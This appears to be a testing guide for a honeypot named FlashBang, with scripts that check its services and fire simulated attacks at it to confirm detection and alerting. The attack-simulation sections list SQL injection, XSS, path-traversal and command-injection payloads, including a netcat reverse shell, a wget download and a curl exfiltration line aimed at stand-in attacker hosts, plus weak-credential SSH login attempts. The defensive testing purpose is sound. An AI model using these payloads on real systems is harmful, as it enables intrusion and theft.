# FlashBang Honeypot Testing Guide 🧪🎯

## Table of Contents
- [Safety First](#safety-first)
- [Basic Functionality Tests](#basic-functionality-tests)
- [Attack Simulation Tests](#attack-simulation-tests)
- [Interactive Service Tests](#interactive-service-tests)
- [Monitoring & Alert Tests](#monitoring--alert-tests)
- [Performance Testing](#performance-testing)
- [Automated Testing Suite](#automated-testing-suite)

## Safety First ⚠️

**IMPORTANT**: Only test on systems you own or have explicit permission to test!

### Testing Environment Setup
```bash
# Create isolated testing environment
# Option 1: Local VM
vagrant init ubuntu/focal64
vagrant up
vagrant ssh

# Option 2: Docker network isolation
docker network create --driver bridge honeypot-test
docker run -it --network honeypot-test ubuntu:20.04 bash

# Option 3: AWS test VPC (recommended)
aws ec2 create-vpc --cidr-block 10.99.0.0/16 --tag-specifications 'ResourceType=vpc,Tags=[{Key=Name,Value=FlashBang-Test}]'
```

## Basic Functionality Tests

### 1. Service Availability Tests

```bash
# Test if services are running
#!/bin/bash

HONEYPOT_IP="your-honeypot-ip"

echo "=== FlashBang Service Test ==="

# Test HTTP
echo -n "Testing HTTP (80)... "
curl -s -o /dev/null -w "%{http_code}" http://$HONEYPOT_IP && echo " ✓ OK" || echo " ✗ Failed"

# Test HTTPS
echo -n "Testing HTTPS (443)... "
curl -k -s -o /dev/null -w "%{http_code}" https://$HONEYPOT_IP && echo " ✓ OK" || echo " ✗ Failed"

# Test SSH honeypot
echo -n "Testing SSH (2222)... "
nc -zv $HONEYPOT_IP 2222 2>&1 | grep -q "succeeded" && echo " ✓ OK" || echo " ✗ Failed"

# Test FTP
echo -n "Testing FTP (21)... "
nc -zv $HONEYPOT_IP 21 2>&1 | grep -q "succeeded" && echo " ✓ OK" || echo " ✗ Failed"

# Test Telnet
echo -n "Testing Telnet (23)... "
nc -zv $HONEYPOT_IP 23 2>&1 | grep -q "succeeded" && echo " ✓ OK" || echo " ✗ Failed"
```

### 2. Web Endpoint Tests

```bash
# Test various web endpoints
#!/bin/bash

HONEYPOT_URL="http://your-honeypot-ip"

# Create test script
cat > test_endpoints.sh << 'EOF'
#!/bin/bash

endpoints=(
    "/"
    "/admin"
    "/wp-admin"
    "/.env"
    "/config.php"
    "/.git/config"
    "/backup.sql"
    "/debug"
    "/api/docs"
    "/logs"
    "/shell"
)

echo "Testing FlashBang Web Endpoints..."
echo "================================="

for endpoint in "${endpoints[@]}"; do
    echo -n "Testing $endpoint... "
    response=$(curl -s -o /dev/null -w "%{http_code}" "$HONEYPOT_URL$endpoint")
    
    if [ "$response" == "200" ]; then
        echo "✓ OK (HTTP $response)"
        
        # Get a preview of the response
        content=$(curl -s "$HONEYPOT_URL$endpoint" | head -n 3 | tr '\n' ' ')
        echo "  Preview: ${content:0:80}..."
    else
        echo "✗ Failed (HTTP $response)"
    fi
    echo
done
EOF

chmod +x test_endpoints.sh
./test_endpoints.sh
```

### 3. Response Validation Tests

```python
# test_responses.py
import requests
import json

HONEYPOT_URL = "http://your-honeypot-ip"

def test_honeypot_responses():
    """Test if honeypot returns expected deceptive content"""
    
    tests = [
        {
            "name": "Fake .env file",
            "endpoint": "/.env",
            "expected_content": ["DATABASE_URL", "API_KEY", "SECRET_KEY"],
            "should_contain_warning": True
        },
        {
            "name": "Fake admin panel",
            "endpoint": "/admin",
            "expected_content": ["login", "password", "Admin"],
            "should_contain_warning": False
        },
        {
            "name": "Fake git config",
            "endpoint": "/.git/config",
            "expected_content": ["repositoryformatversion", "origin"],
            "should_contain_warning": True
        },
        {
            "name": "Debug endpoint",
            "endpoint": "/debug",
            "expected_content": ["environment", "api_keys"],
            "should_contain_warning": True
        }
    ]
    
    print("FlashBang Response Validation Tests")
    print("===================================\n")
    
    for test in tests:
        print(f"Testing: {test['name']}")
        print(f"Endpoint: {test['endpoint']}")
        
        try:
            response = requests.get(f"{HONEYPOT_URL}{test['endpoint']}", timeout=5)
            content = response.text.lower()
            
            # Check expected content
            found_content = []
            for expected in test['expected_content']:
                if expected.lower() in content:
                    found_content.append(expected)
            
            if found_content:
                print(f"✓ Found expected content: {', '.join(found_content)}")
            else:
                print(f"✗ Missing expected content")
            
            # Check for honeypot indicators
            if test['should_contain_warning']:
                honeypot_indicators = ["honeypot", "flashbang", "gotcha", "logged"]
                found_indicators = [ind for ind in honeypot_indicators if ind in content]
                if found_indicators:
                    print(f"✓ Contains honeypot warnings: {', '.join(found_indicators)}")
                else:
                    print(f"⚠ No honeypot warnings found")
            
            print(f"Response length: {len(response.text)} bytes")
            print(f"Status code: {response.status_code}")
            
        except Exception as e:
            print(f"✗ Test failed: {str(e)}")
        
        print("-" * 50 + "\n")

if __name__ == "__main__":
    test_honeypot_responses()
```

## Attack Simulation Tests

### 1. SQL Injection Tests

```bash
# sql_injection_test.sh
#!/bin/bash

HONEYPOT_URL="http://your-honeypot-ip"

echo "SQL Injection Attack Simulation"
echo "==============================="

# Test various SQL injection payloads
payloads=(
    "admin' OR '1'='1"
    "admin'; DROP TABLE users; --"
    "' UNION SELECT * FROM users --"
    "admin' AND 1=1 --"
    "'; SELECT * FROM information_schema.tables; --"
)

for payload in "${payloads[@]}"; do
    echo "Testing payload: $payload"
    
    # Test on login endpoint
    response=$(curl -s -X POST "$HONEYPOT_URL/admin/login" \
        -d "username=$payload&password=test" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    if echo "$response" | grep -q "logged\|detected\|FlashBang"; then
        echo "✓ Honeypot detected the attack!"
    else
        echo "⚠ Check honeypot detection"
    fi
    echo
done
```

### 2. XSS Attack Tests

```python
# xss_test.py
import requests
from urllib.parse import quote

HONEYPOT_URL = "http://your-honeypot-ip"

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert('XSS')>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>"
]

print("XSS Attack Simulation")
print("====================\n")

for payload in xss_payloads:
    print(f"Testing XSS payload: {payload[:50]}...")
    
    # Test various endpoints
    endpoints = ["/search", "/comment", "/api/v1/user"]
    
    for endpoint in endpoints:
        try:
            # GET request with payload
            response = requests.get(
                f"{HONEYPOT_URL}{endpoint}?q={quote(payload)}",
                timeout=5
            )
            
            # POST request with payload
            post_response = requests.post(
                f"{HONEYPOT_URL}{endpoint}",
                data={"input": payload},
                timeout=5
            )
            
            # Check if attack was logged
            if "logged" in response.text.lower() or "flashbang" in response.text.lower():
                print(f"  ✓ XSS detected on {endpoint}")
            else:
                print(f"  ⚠ Check detection on {endpoint}")
                
        except Exception as e:
            print(f"  Error: {str(e)}")
    
    print()
```

### 3. Directory Traversal Tests

```bash
# lfi_test.sh
#!/bin/bash

HONEYPOT_URL="http://your-honeypot-ip"

echo "Directory Traversal / LFI Attack Simulation"
echo "=========================================="

# LFI payloads
payloads=(
    "../../etc/passwd"
    "..\\..\\..\\windows\\system32\\config\\sam"
    "....//....//....//etc/passwd"
    "/etc/passwd%00"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "file:///etc/passwd"
)

for payload in "${payloads[@]}"; do
    echo -e "\nTesting: $payload"
    
    # Test on file parameter
    curl -s "$HONEYPOT_URL/download?file=$payload" | head -5
    
    # Test on page parameter
    curl -s "$HONEYPOT_URL/page?name=$payload" | head -5
done
```

### 4. Command Injection Tests

```python
# command_injection_test.py
import requests
import time

HONEYPOT_URL = "http://your-honeypot-ip"

command_payloads = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(cat /etc/shadow)",
    "; nc -e /bin/sh attacker.com 4444",
    "|| wget http://malicious.com/shell.sh",
    "; curl http://attacker.com/$(whoami)"
]

print("Command Injection Attack Simulation")
print("==================================\n")

for payload in command_payloads:
    print(f"Testing payload: {payload}")
    
    # Test on various endpoints
    test_endpoints = [
        "/ping?host=8.8.8.8" + payload,
        "/execute?cmd=ls" + payload,
        "/system?action=restart" + payload
    ]
    
    for endpoint in test_endpoints:
        try:
            start_time = time.time()
            response = requests.get(f"{HONEYPOT_URL}{endpoint}", timeout=5)
            response_time = time.time() - start_time
            
            print(f"  Endpoint: {endpoint.split('?')[0]}")
            print(f"  Response time: {response_time:.2f}s")
            
            if "logged" in response.text.lower() or "honeypot" in response.text.lower():
                print(f"  ✓ Attack detected and logged")
            
        except requests.Timeout:
            print(f"  ⚠ Request timed out (possible sleep payload)")
        except Exception as e:
            print(f"  Error: {str(e)}")
    
    print()
```

## Interactive Service Tests

### 1. SSH Honeypot Test

```python
# ssh_honeypot_test.py
import paramiko
import socket

def test_ssh_honeypot(host, port=2222):
    """Test SSH honeypot interactions"""
    
    print("SSH Honeypot Test")
    print("=================\n")
    
    # Test weak credentials
    weak_creds = [
        ("admin", "admin"),
        ("root", "root"),
        ("admin", "password"),
        ("root", "toor"),
        ("test", "test")
    ]
    
    for username, password in weak_creds:
        print(f"Testing {username}:{password}")
        
        try:
            # Create SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try to connect
            client.connect(host, port=port, username=username, password=password, timeout=10)
            
            print("  ✓ Login successful (honeypot accepted weak creds)")
            
            # Try some commands
            commands = ["whoami", "id", "ls -la", "cat /etc/passwd", "uname -a"]
            
            for cmd in commands:
                stdin, stdout, stderr = client.exec_command(cmd)
                output = stdout.read().decode()
                
                if output:
                    print(f"  Command '{cmd}' output: {output.strip()[:50]}...")
            
            client.close()
            
        except paramiko.AuthenticationException:
            print("  ✗ Authentication failed")
        except Exception as e:
            print(f"  Error: {str(e)}")
        
        print()
```

### 2. FTP Honeypot Test

```python
# ftp_honeypot_test.py
from ftplib import FTP
import io

def test_ftp_honeypot(host, port=21):
    """Test FTP honeypot"""
    
    print("FTP Honeypot Test")
    print("=================\n")
    
    try:
        # Connect to FTP
        ftp = FTP()
        ftp.connect(host, port)
        
        print(f"Banner: {ftp.getwelcome()}")
        
        # Test anonymous login
        try:
            ftp.login('anonymous', 'test@test.com')
            print("✓ Anonymous login successful")
        except:
            print("✗ Anonymous login failed")
        
        # List files
        print("\nDirectory listing:")
        ftp.dir()
        
        # Try to download a file
        files_to_test = ['passwords.txt', 'database_backup.sql', 'config.ini']
        
        for filename in files_to_test:
            try:
                print(f"\nAttempting to download: {filename}")
                content = io.BytesIO()
                ftp.retrbinary(f'RETR {filename}', content.write)
                content.seek(0)
                print(f"Content preview: {content.read(100)}")
            except Exception as e:
                print(f"Download failed: {str(e)}")
        
        # Try to upload a file
        try:
            print("\nAttempting file upload...")
            upload_content = io.BytesIO(b"Test upload content")
            ftp.storbinary('STOR test.txt', upload_content)
            print("Upload command sent")
        except Exception as e:
            print(f"✓ Upload blocked: {str(e)}")
        
        ftp.quit()
        
    except Exception as e:
        print(f"FTP test error: {str(e)}")
```

### 3. Telnet Honeypot Test

```python
# telnet_honeypot_test.py
import telnetlib
import time

def test_telnet_honeypot(host, port=23):
    """Test Telnet honeypot"""
    
    print("Telnet Honeypot Test")
    print("===================\n")
    
    try:
        # Connect to telnet
        tn = telnetlib.Telnet(host, port, timeout=10)
        
        # Read banner
        banner = tn.read_until(b"login: ", timeout=5)
        print(f"Banner: {banner.decode('utf-8', errors='ignore')}")
        
        # Try login
        tn.write(b"admin\n")
        tn.read_until(b"Password: ", timeout=5)
        tn.write(b"admin\n")
        
        # Read response
        time.sleep(2)
        response = tn.read_very_eager().decode('utf-8', errors='ignore')
        print(f"Login response:\n{response}")
        
        if "flashbang" in response.lower() or "honeypot" in response.lower():
            print("\n✓ Honeypot warning detected!")
        
        tn.close()
        
    except Exception as e:
        print(f"Telnet test error: {str(e)}")
```

## Monitoring & Alert Tests

### 1. CloudWatch Metrics Test

```bash
# cloudwatch_test.sh
#!/bin/bash

echo "CloudWatch Metrics Test"
echo "======================"

# Trigger attacks to generate metrics
HONEYPOT_URL="http://your-honeypot-ip"

# Generate attack traffic
for i in {1..50}; do
    curl -s "$HONEYPOT_URL/admin" -d "username=admin' OR '1'='1&password=test" > /dev/null
    curl -s "$HONEYPOT_URL/.env" > /dev/null
    curl -s "$HONEYPOT_URL/shell?cmd=ls" > /dev/null
done

echo "Generated 150 attack requests"
echo "Waiting 5 minutes for metrics to appear..."
sleep 300

# Check CloudWatch metrics
aws cloudwatch get-metric-statistics \
    --namespace FlashBang/Honeypot \
    --metric-name AttackAttempts \
    --start-time $(date -u -d '10 minutes ago' +%Y-%m-%dT%H:%M:%S) \
    --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
    --period 300 \
    --statistics Sum \
    --dimensions Name=Endpoint,Value=/admin
```

### 2. Alert Testing

```python
# test_alerts.py
import requests
import time

def test_high_volume_alert(honeypot_url, num_requests=100):
    """Generate high volume of attacks to trigger alerts"""
    
    print(f"Generating {num_requests} attack requests to trigger alerts...")
    
    attack_endpoints = [
        "/admin",
        "/.env",
        "/backup.sql",
        "/api/v1/admin/execute"
    ]
    
    sql_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM passwords --"
    ]
    
    for i in range(num_requests):
        endpoint = attack_endpoints[i % len(attack_endpoints)]
        payload = sql_payloads[i % len(sql_payloads)]
        
        try:
            requests.post(
                f"{honeypot_url}{endpoint}",
                data={"username": f"admin{payload}", "password": "test"},
                timeout=2
            )
            
            if i % 10 == 0:
                print(f"  Sent {i+1}/{num_requests} requests")
                
        except:
            pass
        
        # Small delay to avoid overwhelming
        time.sleep(0.1)
    
    print("\n✓ Attack simulation complete")
    print("Check your email/Slack for alerts!")

if __name__ == "__main__":
    test_high_volume_alert("http://your-honeypot-ip", 100)
```

### 3. Log Verification

```bash
# verify_logs.sh
#!/bin/bash

echo "Log Verification Test"
echo "===================="

# SSH to honeypot
HONEYPOT_IP="your-honeypot-ip"
KEY_FILE="your-key.pem"

ssh -i $KEY_FILE ubuntu@$HONEYPOT_IP << 'EOF'
echo "Checking attack logs..."

# Check Flask logs
echo -e "\n=== Recent Flask Attack Logs ==="
tail -n 20 /opt/flashbang/logs/attacks.log | grep "Attack attempt"

# Check Nginx logs
echo -e "\n=== Recent Nginx Access Logs ==="
tail -n 20 /var/log/nginx/flashbang_access.log | grep -E "(\.env|admin|\.git)"

# Check database
echo -e "\n=== Attack Statistics ==="
sqlite3 /opt/flashbang/web_attacks.db "SELECT attack_type, COUNT(*) as count FROM web_attacks WHERE timestamp > datetime('now', '-1 hour') GROUP BY attack_type;"

# Check S3 backup
echo -e "\n=== S3 Log Backup Status ==="
aws s3 ls s3://flashbang-logs/daily-logs/ --recursive | tail -5
EOF
```

## Performance Testing

### 1. Load Testing

```python
# load_test.py
import concurrent.futures
import requests
import time
import statistics

def make_request(url):
    """Make a single request and return response time"""
    start = time.time()
    try:
        response = requests.get(url, timeout=10)
        return time.time() - start, response.status_code
    except:
        return None, None

def load_test(honeypot_url, num_requests=1000, num_workers=50):
    """Perform load testing on honeypot"""
    
    print(f"Load Testing FlashBang Honeypot")
    print(f"URL: {honeypot_url}")
    print(f"Requests: {num_requests}")
    print(f"Concurrent workers: {num_workers}")
    print("=" * 50)
    
    urls = [
        f"{honeypot_url}/",
        f"{honeypot_url}/admin",
        f"{honeypot_url}/.env",
        f"{honeypot_url}/api/v1/users"
    ]
    
    response_times = []
    status_codes = {}
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = []
        
        for i in range(num_requests):
            url = urls[i % len(urls)]
            future = executor.submit(make_request, url)
            futures.append(future)
        
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            response_time, status_code = future.result()
            
            if response_time:
                response_times.append(response_time)
                status_codes[status_code] = status_codes.get(status_code, 0) + 1
            
            if (i + 1) % 100 == 0:
                print(f"Completed {i + 1}/{num_requests} requests")
    
    total_time = time.time() - start_time
    
    # Calculate statistics
    print("\nResults:")
    print(f"Total time: {total_time:.2f} seconds")
    print(f"Requests per second: {num_requests / total_time:.2f}")
    print(f"Average response time: {statistics.mean(response_times):.3f}s")
    print(f"Median response time: {statistics.median(response_times):.3f}s")
    print(f"95th percentile: {statistics.quantiles(response_times, n=20)[18]:.3f}s")
    
    print("\nStatus codes:")
    for code, count in sorted(status_codes.items()):
        print(f"  {code}: {count}")

if __name__ == "__main__":
    load_test("http://your-honeypot-ip", num_requests=1000, num_workers=50)
```

## Automated Testing Suite

### Complete Test Script

```python
# run_all_tests.py
#!/usr/bin/env python3

import sys
import subprocess
import time
from datetime import datetime

class FlashBangTester:
    def __init__(self, honeypot_ip):
        self.honeypot_ip = honeypot_ip
        self.honeypot_url = f"http://{honeypot_ip}"
        self.test_results = []
    
    def run_test(self, test_name, test_function):
        """Run a test and record results"""
        print(f"\n{'=' * 60}")
        print(f"Running: {test_name}")
        print(f"{'=' * 60}")
        
        start_time = time.time()
        try:
            test_function()
            status = "PASSED"
            error = None
        except Exception as e:
            status = "FAILED"
            error = str(e)
        
        duration = time.time() - start_time
        
        self.test_results.append({
            "test": test_name,
            "status": status,
            "duration": duration,
            "error": error
        })
        
        print(f"\nTest {status} in {duration:.2f}s")
    
    def test_basic_connectivity(self):
        """Test basic connectivity to honeypot"""
        import requests
        response = requests.get(self.honeypot_url, timeout=10)
        assert response.status_code == 200, f"Got status {response.status_code}"
        print("✓ Basic connectivity OK")
    
    def test_all_endpoints(self):
        """Test all honeypot endpoints"""
        import requests
        
        endpoints = [
            "/", "/admin", "/.env", "/.git/config", 
            "/backup.sql", "/debug", "/api/docs"
        ]
        
        for endpoint in endpoints:
            response = requests.get(f"{self.honeypot_url}{endpoint}", timeout=5)
            assert response.status_code == 200, f"Endpoint {endpoint} returned {response.status_code}"
            print(f"✓ {endpoint} - OK")
    
    def test_sql_injection_detection(self):
        """Test SQL injection detection"""
        import requests
        
        payload = "admin' OR '1'='1"
        response = requests.post(
            f"{self.honeypot_url}/admin/login",
            data={"username": payload, "password": "test"}
        )
        
        assert "logged" in response.text.lower() or "detected" in response.text.lower()
        print("✓ SQL injection detection working")
    
    def test_ssh_honeypot(self):
        """Test SSH honeypot service"""
        import socket
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((self.honeypot_ip, 2222))
        sock.close()
        
        assert result == 0, "SSH honeypot not accessible"
        print("✓ SSH honeypot accessible on port 2222")
    
    def test_alert_generation(self):
        """Test that alerts are generated"""
        import requests
        
        # Generate multiple attacks
        for i in range(20):
            requests.post(
                f"{self.honeypot_url}/admin",
                data={"username": f"attack{i}", "password": "hack"}
            )
        
        print("✓ Generated 20 attack requests for alert testing")
        print("  Check CloudWatch/Email/Slack for alerts")
    
    def generate_report(self):
        """Generate test report"""
        print("\n" + "=" * 60)
        print("FLASHBANG HONEYPOT TEST REPORT")
        print("=" * 60)
        print(f"Timestamp: {datetime.now().isoformat()}")
        print(f"Honeypot IP: {self.honeypot_ip}")
        print(f"Total tests: {len(self.test_results)}")
        
        passed = sum(1 for r in self.test_results if r['status'] == 'PASSED')
        failed = sum(1 for r in self.test_results if r['status'] == 'FAILED')
        
        print(f"Passed: {passed}")
        print(f"Failed: {failed}")
        print(f"Success rate: {(passed/len(self.test_results)*100):.1f}%")
        
        if failed > 0:
            print("\nFailed tests:")
            for result in self.test_results:
                if result['status'] == 'FAILED':
                    print(f"  - {result['test']}: {result['error']}")
        
        print("\nDetailed results:")
        for result in self.test_results:
            status_icon = "✓" if result['status'] == 'PASSED' else "✗"
            print(f"{status_icon} {result['test']:<40} {result['duration']:.2f}s")

def main():
    if len(sys.argv) != 2:
        print("Usage: python run_all_tests.py <honeypot-ip>")
        sys.exit(1)
    
    honeypot_ip = sys.argv[1]
    tester = FlashBangTester(honeypot_ip)
    
    # Run all tests
    tests = [
        ("Basic Connectivity", tester.test_basic_connectivity),
        ("All Endpoints", tester.test_all_endpoints),
        ("SQL Injection Detection", tester.test_sql_injection_detection),
        ("SSH Honeypot Service", tester.test_ssh_honeypot),
        ("Alert Generation", tester.test_alert_generation),
    ]
    
    for test_name, test_func in tests:
        tester.run_test(test_name, test_func)
    
    # Generate report
    tester.generate_report()

if __name__ == "__main__":
    main()
```

### Running the Complete Test Suite

```bash
# Make executable
chmod +x run_all_tests.py

# Run all tests
./run_all_tests.py your-honeypot-ip

# Run with output to file
./run_all_tests.py your-honeypot-ip | tee test_results_$(date +%Y%m%d_%H%M%S).log
```

## Test Checklist

- [ ] **Service Availability**
  - [ ] HTTP (port 80) responds
  - [ ] HTTPS (port 443) responds with certificate
  - [ ] SSH honeypot (port 2222) accepts connections
  - [ ] FTP (port 21) shows banner
  - [ ] Telnet (port 23) shows login prompt

- [ ] **Attack Detection**
  - [ ] SQL injection attempts are logged
  - [ ] XSS attempts are detected
  - [ ] Directory traversal is caught
  - [ ] Command injection is blocked
  - [ ] Brute force attempts trigger alerts

- [ ] **Deception Quality**
  - [ ] Fake files contain believable content
  - [ ] Error messages don't reveal it